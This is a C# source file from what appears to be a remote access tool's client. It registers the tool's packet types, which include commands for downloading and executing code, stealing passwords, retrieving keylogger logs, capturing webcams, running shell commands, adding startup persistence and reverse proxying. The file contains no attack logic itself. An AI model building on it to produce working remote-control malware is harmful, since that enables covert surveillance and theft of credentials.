using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace xClient.Core.Packets
{
    public class PacketRegistery
    {
        public static Type[] GetPacketTypes()
        {
            return new Type[]
            {
                typeof (Packets.ServerPackets.GetAuthentication),
                typeof (Packets.ServerPackets.DoClientDisconnect),
                typeof (Packets.ServerPackets.DoClientReconnect),
                typeof (Packets.ServerPackets.DoClientUninstall),
                typeof (Packets.ServerPackets.DoWebcamStop),
                typeof (Packets.ServerPackets.DoAskElevate),
                typeof (Packets.ServerPackets.DoDownloadAndExecute),
                typeof (Packets.ServerPackets.DoUploadAndExecute),
                typeof (Packets.ServerPackets.GetDesktop),
                typeof (Packets.ServerPackets.GetProcesses),
                typeof (Packets.ServerPackets.DoProcessKill),
                typeof (Packets.ServerPackets.DoProcessStart),
                typeof (Packets.ServerPackets.GetDrives),
                typeof (Packets.ServerPackets.GetDirectory),
                typeof (Packets.ServerPackets.DoDownloadFile),
                typeof (Packets.ServerPackets.DoMouseEvent),
                typeof (Packets.ServerPackets.DoKeyboardEvent),
                typeof (Packets.ServerPackets.GetSystemInfo),
                typeof (Packets.ServerPackets.DoVisitWebsite),
                typeof (Packets.ServerPackets.DoShowMessageBox),
                typeof (Packets.ServerPackets.DoClientUpdate),
                typeof (Packets.ServerPackets.GetMonitors),
                typeof (Packets.ServerPackets.GetWebcams),
                typeof (Packets.ServerPackets.GetWebcam),
                typeof (Packets.ServerPackets.DoShellExecute),
                typeof (Packets.ServerPackets.DoPathRename),
                typeof (Packets.ServerPackets.DoPathDelete),
                typeof (Packets.ServerPackets.DoShutdownAction),
                typeof (Packets.ServerPackets.GetStartupItems),
                typeof (Packets.ServerPackets.DoStartupItemAdd),
                typeof (Packets.ServerPackets.DoStartupItemRemove),
                typeof (Packets.ServerPackets.DoDownloadFileCancel),
                typeof (Packets.ServerPackets.GetKeyloggerLogs),
                typeof (Packets.ServerPackets.DoUploadFile),
                typeof (Packets.ServerPackets.GetPasswords),
                typeof (Packets.ServerPackets.DoLoadRegistryKey),
                typeof (Packets.ServerPackets.DoCreateRegistryKey),
                typeof (Packets.ServerPackets.DoDeleteRegistryKey),
                typeof (Packets.ServerPackets.DoRenameRegistryKey),
                typeof (Packets.ServerPackets.DoCreateRegistryValue),
                typeof (Packets.ServerPackets.DoDeleteRegistryValue),
                typeof (Packets.ServerPackets.DoRenameRegistryValue),
                typeof (Packets.ServerPackets.DoChangeRegistryValue),
                typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                typeof (Packets.ServerPackets.GetConnections),
                typeof (Packets.ServerPackets.DoCloseConnection),
                typeof (Packets.ClientPackets.GetAuthenticationResponse),
                typeof (Packets.ClientPackets.SetStatus),
                typeof (Packets.ClientPackets.SetStatusFileManager),
                typeof (Packets.ClientPackets.SetUserStatus),
                typeof (Packets.ClientPackets.GetDesktopResponse),
                typeof (Packets.ClientPackets.GetProcessesResponse),
                typeof (Packets.ClientPackets.GetDrivesResponse),
                typeof (Packets.ClientPackets.GetDirectoryResponse),
                typeof (Packets.ClientPackets.DoDownloadFileResponse),
                typeof (Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Packets.ClientPackets.GetMonitorsResponse),
                typeof (Packets.ClientPackets.GetWebcamsResponse),
                typeof (Packets.ClientPackets.GetWebcamResponse),
                typeof (Packets.ClientPackets.DoShellExecuteResponse),
                typeof (Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
                typeof (Packets.ClientPackets.GetPasswordsResponse),
                typeof (Packets.ClientPackets.GetRegistryKeysResponse),
                typeof (Packets.ClientPackets.GetCreateRegistryKeyResponse),
                typeof (Packets.ClientPackets.GetDeleteRegistryKeyResponse),
                typeof (Packets.ClientPackets.GetRenameRegistryKeyResponse),
                typeof (Packets.ClientPackets.GetCreateRegistryValueResponse),
                typeof (Packets.ClientPackets.GetDeleteRegistryValueResponse),
                typeof (Packets.ClientPackets.GetRenameRegistryValueResponse),
                typeof (Packets.ClientPackets.GetChangeRegistryValueResponse),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect),
                typeof (Packets.ClientPackets.GetConnectionsResponse),
                typeof (Packets.ServerPackets.SearchDirectory),
                typeof (Packets.ClientPackets.SearchDirectoryResponse)

            };
        }
    }
}
